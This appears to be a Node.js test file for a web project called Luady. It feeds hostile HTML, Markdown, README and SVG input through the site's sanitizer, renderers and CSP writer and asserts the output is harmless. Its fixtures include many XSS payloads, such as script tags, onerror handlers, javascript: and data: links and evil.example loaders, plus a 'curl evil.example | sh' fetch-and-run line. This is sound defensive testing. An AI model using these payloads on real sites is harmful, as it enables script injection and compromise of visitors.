/**
 * A change to a document alone must never run code on the website, send visitors elsewhere or load anything: hostile
 * Markdown, a hostile README and a hostile drawing go through the same readers the build uses, and come out harmless.
 */
import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, test } from 'node:test';
import { isNextScript, withPolicy } from '../lib/csp.mjs';
import { renderDoc } from '../lib/markdown.mjs';
import { docsIntro, landingCopy } from '../lib/readme.mjs';
import { ALLOWED_TAGS, plainSvg, sanitizeHtml } from '../lib/sanitize.mjs';

const PAGES = new Set(['README.md', 'rooms.md']);

/** Every way in the tests know of to get active content into a page through raw HTML or Markdown. */
const ATTACKS = [
  '<script>document.querySelectorAll("pre").forEach((p) => { p.textContent = "curl evil.example | sh"; })</script>',
  '<SCRIPT src="https://evil.example/x.js"></SCRIPT>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<img src=x onerror=alert(1)>',
  '<img/src=x/onerror=alert(1)>',
  '<svg onload=alert(1)><circle r="1"/></svg>',
  '<iframe src="https://evil.example"></iframe>',
  '<object data="https://evil.example/x.swf"></object>',
  '<embed src="https://evil.example/x">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<style>body { display: none }</style>',
  '<base href="https://evil.example/">',
  '<form action="https://evil.example"><input name="pin"></form>',
  '<a href="javascript:alert(1)">click</a>',
  '<a href="&#106;avascript:alert(1)">click</a>',
  '<a href=" java\tscript:alert(1)">click</a>',
  '<a href="data:text/html,<script>alert(1)</script>">click</a>',
  '<p onclick="alert(1)" style="position:fixed">text</p>',
  '<details open ontoggle=alert(1)>x</details>',
  '<scr<script>ipt>alert(1)</script>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
];

/** What must not appear in anything a reader returns. */
function assertHarmless(html, where) {
  assert.doesNotMatch(html, /<(?:script|meta|iframe|object|embed|link|style|base|form|input|svg|math|details)\b/i, `${where}: a forbidden tag survived: ${html}`);
  assert.doesNotMatch(html, /<[a-z][^>]*\son[a-z]+\s*=/i, `${where}: an event handler survived: ${html}`);
  assert.doesNotMatch(html, /<[a-z][^>]*\sstyle\s*=/i, `${where}: a style attribute survived: ${html}`);
  assert.doesNotMatch(html, /\s(?:href|src|srcset)\s*=\s*"\s*(?:javascript|data|vbscript):/i, `${where}: an active address survived: ${html}`);
  assert.doesNotMatch(html, /\s(?:href|src)\s*=\s*"(?:&#|\s)/i, `${where}: an encoded address survived: ${html}`);
}

test('the allowed list is short and holds no active tag', () => {
  assert.deepEqual(Object.keys(ALLOWED_TAGS).sort(), ['a', 'b', 'br', 'code', 'em', 'i', 'img', 'kbd', 'p', 'picture', 'source', 'strong', 'sub',
    'sup', 'table', 'tbody', 'td', 'th', 'thead', 'tr']);
  for (const attributes of Object.values(ALLOWED_TAGS)) {
    for (const name of attributes) assert.doesNotMatch(name, /^on|^style$|^action$|^formaction$|^xlink|^data$/);
  }
});

test('each attack in raw HTML comes out as text or without its active part', () => {
  for (const attack of ATTACKS) assertHarmless(sanitizeHtml(attack), attack);
  assert.equal(sanitizeHtml('<script>alert(1)</script>'), '&lt;script&gt;alert(1)&lt;/script&gt;');
  assert.equal(sanitizeHtml('<img src=x onerror=alert(1)>'), '<img src="x">');
  assert.equal(sanitizeHtml('<a href="javascript:alert(1)">click</a>'), '<a>click</a>');
  assert.equal(sanitizeHtml('<img src="https://evil.example/x.png" alt="x">'), '<img alt="x">', 'pictures come from the site only');
});

test('what the docs really use stays as it is', () => {
  const picture = '<picture>\n  <source media="(prefers-reduced-motion: reduce)" srcset="assets/office.png">\n'
    + '  <img src="assets/office-demo.webp" width="800" alt="The office &amp; its rooms">\n</picture>';
  assert.equal(sanitizeHtml(picture), picture.replace(' &amp; ', ' &amp; '));
  assert.equal(sanitizeHtml('<p class="caption"><sub>The real website.</sub></p>'), '<p class="caption"><sub>The real website.</sub></p>');
  assert.equal(sanitizeHtml('<kbd>Ctrl</kbd>+<kbd>C</kbd>'), '<kbd>Ctrl</kbd>+<kbd>C</kbd>');
  assert.equal(sanitizeHtml('<a href="https://example.com/">x</a> <a href="rooms.md#a">y</a> <a href="mailto:a@example.com">z</a>'),
    '<a href="https://example.com/">x</a> <a href="rooms.md#a">y</a> <a href="mailto:a@example.com">z</a>');
  assert.equal(sanitizeHtml('<!-- a note for editors -->'), '');
});

test('a hostile Markdown file renders harmless, and its good parts still render', () => {
  const markdown = [
    '# Rooms', '', 'A room holds sessions. <script>alert(1)</script> And <img src=x onerror=alert(1)> inline.', '',
    ...ATTACKS.flatMap((attack) => [attack, '']),
    '[a link](javascript:alert(1)) and [another](data:text/html,x) and [fine](rooms.md#remove).', '',
    '![a picture](javascript:alert(1)) ![remote](https://evil.example/x.png "title")', '',
    '<p class="caption"><sub>Press <kbd>Ctrl</kbd> and run `npm test`.</sub></p>', '',
  ].join('\n');
  const page = renderDoc(markdown, PAGES, { basePath: '/luady' });
  assertHarmless(page.html, 'renderDoc');
  assert.match(page.html, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/, 'the script shows as text');
  assert.match(page.html, /&lt;meta http-equiv="refresh"/, 'the refresh shows as text');
  assert.match(page.html, /a link and another and <a href="\/luady\/docs\/rooms\/#remove">fine<\/a>/);
  assert.match(page.html, /a picture remote/, 'pictures from elsewhere show their alt text');
  assert.match(page.html, /<p class="caption"><sub>Press <kbd>Ctrl<\/kbd> and run <code>npm test<\/code>\.<\/sub><\/p>/);
});

let repo;
before(async () => {
  repo = await mkdtemp(join(tmpdir(), 'luady-hostile-'));
  await mkdir(join(repo, 'docs'));
  const evil = ATTACKS.join(' ');
  const readme = `# Luady

## What it is

Luady runs on a machine of yours. ${evil} In the browser you get an office:

- Each **server is a room**. ${evil}
- Click a session [to see it](javascript:alert(1)). ${evil}

## Try it

Or run the demo on your computer. ${evil}

\`\`\`sh
npm ci
\`\`\`

The first run builds what it needs. ${evil} The demo PIN is \`123456\`.

## Run it for real

You need Linux. ${evil}

\`\`\`sh
npm start
\`\`\`

\`npm start\` prints a code. ${evil}

## What makes it different

<table><tr><td>
<p><strong>Several servers in one place.</strong> One office. ${evil}</p>
<p><strong>A room for each server or project.</strong> Rooms. <a href="javascript:alert(1)">x</a></p>
<p><strong>An optional manager.</strong> A manager. <img src=x onerror=alert(1)></p>
</td></tr></table>

## How it works

- **The hub** runs here. ${evil}

## Security

- The hub listens on 127.0.0.1. ${evil}

Sessions started from Luady run Claude Code with its permission prompts bypassed, so give each server a user. ${evil}
`;
  await writeFile(join(repo, 'README.md'), readme);
  await writeFile(join(repo, 'docs', 'README.md'), `# Docs\n\nLuady is a web app. ${evil} [x](javascript:alert(1))\n`);
});

after(async () => {
  if (repo !== undefined) await rm(repo, { recursive: true, force: true });
});

test('a hostile README and docs overview give the landing page nothing active', () => {
  const copy = landingCopy(repo, new Set(['README.md']), '/luady');
  const pieces = [copy.lead, copy.talk, copy.permission, copy.tryLead, copy.tryNote, copy.runNeeds, copy.runNote, ...copy.how, ...copy.security,
    copy.servers.html, copy.rooms.html, copy.manager.html];
  for (const piece of pieces) assertHarmless(piece, 'landingCopy');
  for (const card of [copy.servers, copy.rooms, copy.manager]) assert.doesNotMatch(card.title, /</);
  assertHarmless(docsIntro(repo, new Set(['README.md']), '/luady'), 'docsIntro');
  assert.match(copy.talk, /Click a session to see it\./, 'a javascript: link keeps only its text');
});

test('the policy writer refuses an inline script that Next.js did not write', () => {
  const page = (scripts) => `<!DOCTYPE html><html><head><meta charSet="utf-8"/></head><body>${scripts}</body></html>`;
  const next = '<script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\\"$Sreact.fragment\\"\\n"])</script>'
    + '<script id="_R_">(globalThis["TURBOPACK"] || (globalThis["TURBOPACK"] = [])).push({"otherChunks":["static/chunks/a.js"],"runtimeModuleIds":[1]});</script>';
  assert.match(withPolicy(page(next), 'index.html'), /script-src 'self' 'sha256-/);
  for (const foreign of [
    '<script>alert(1)</script>',
    '<script>self.__next_f.push([1,"x"]);alert(1)</script>',
    '<script>self.__next_f.push([1,"x"+alert(1)+""])</script>',
    '<script>(self.__next_f=self.__next_f||[]).push([0]);alert(1)</script>',
    '<script id="_R_">(globalThis["TURBOPACK"] || (globalThis["TURBOPACK"] = [])).push({"otherChunks":["https://evil.example/a.js"]});</script>',
    '<script id="_R_">(globalThis["TURBOPACK"] || (globalThis["TURBOPACK"] = [])).push({"otherChunks":[],"x":1});alert(1);</script>',
    '<script id="other">(self.__next_f=self.__next_f||[]).push([0])</script>',
  ]) {
    assert.throws(() => withPolicy(page(next + foreign), 'docs/rooms/index.html'), /docs\/rooms\/index\.html holds an inline script that Next\.js did not write/, foreign);
  }
  assert.equal(isNextScript('self.__next_f.push([2])'), true);
});

test('an inline drawing with anything active in it stops the build', () => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><defs><g id="a"><rect width="1" height="1"/></g></defs><use href="#a"/></svg>';
  assert.equal(plainSvg(svg), svg);
  for (const bad of ['<script>alert(1)</script>', '<foreignObject><p>x</p></foreignObject>', '<rect onclick="x()"/>', '<a href="https://evil.example"><rect/></a>',
    '<use href="https://evil.example/x.svg#a"/>', '<style>rect{}</style>', '<use xlink:href="data:image/svg+xml,x"/>']) {
    assert.throws(() => plainSvg(svg.replace('</svg>', `${bad}</svg>`)), /holds/, bad);
  }
});
